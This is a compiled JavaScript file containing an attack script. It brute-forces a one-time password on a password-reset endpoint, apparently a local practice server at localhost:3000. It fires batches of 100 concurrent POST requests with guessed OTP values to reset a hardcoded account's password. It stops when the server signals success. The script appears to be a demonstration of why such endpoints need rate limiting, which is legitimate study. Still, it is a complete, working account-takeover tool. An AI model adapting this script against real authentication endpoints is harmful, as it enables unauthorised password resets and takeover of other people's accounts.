"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const axios_1 = __importDefault(require("axios"));
const app = (0, express_1.default)();
let flag = 1;
function attack(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            "email": "himanshudangwal99@gmail.com",
            "otp": otp,
            "newPassword": "Himanshu"
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        // console.log(config)
        try {
            let response = yield axios_1.default.request(config);
            console.log(response.data.flag);
            if (response.data.flag == "1") {
                flag = 0;
                console.log("Here");
            }
        }
        catch (error) {
        }
    });
}
function helper() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 190000; i += 100) {
            let flag2 = 0;
            const p = [];
            for (let j = 0; j < 100; j++) {
                p.push(attack((i + j).toString()));
                if (flag == 0) {
                    flag2 = 1;
                    break;
                }
            }
            yield Promise.all(p);
            if (flag2)
                break;
        }
    });
}
helper();
